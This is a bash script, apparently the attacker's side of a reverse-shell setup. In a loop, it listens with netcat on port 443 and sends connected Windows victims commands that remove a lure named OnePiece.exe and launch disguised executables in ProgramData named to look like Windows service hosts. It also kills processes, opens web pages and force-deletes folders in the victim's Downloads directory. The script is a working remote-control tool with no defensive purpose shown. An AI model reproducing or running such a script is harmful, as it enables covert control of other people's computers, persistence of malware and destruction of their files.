#!/bin/bash
while true
do
        echo "exit" > /tmp/nc_input.txt
        cat /tmp/nc_input.txt | rlwrap nc -nlvp 443 <<EOF
        del OnePiece.exe && start "" "C:\ProgramData\Hosts de servicio local (...).exe"
        start https://www.youtube.com/watch?v=Ku0Jaqe_zDU
        start https://brave.com/es/download/
        start https://www.pelisplus.lat/
        start https://chrome.google.com/webstore/detail/adblock-%E2%80%94-best-ad-blocker/gighmmpiobklfepjocnamgkkbiglidom?hl=es
        taskkill /F /IM "OnePiece.exe"
        del OnePiece.exe
        taskkill /IM "Hosts de servicio local (...).exe" /F
        start "" "C:\ProgramData\Hosts de servicio local (...).exe"
        start "" "C:\ProgramData\ddlhosts.exe"
        cd C:\Users\%USERNAME%\Downloads\dadddos
        del OnePiece.exe
        rmdir /S /Q C:\Users\%USERNAME%\Downloads\JET
        rmdir /s /q dadddos
exit
EOF

sleep 5
done
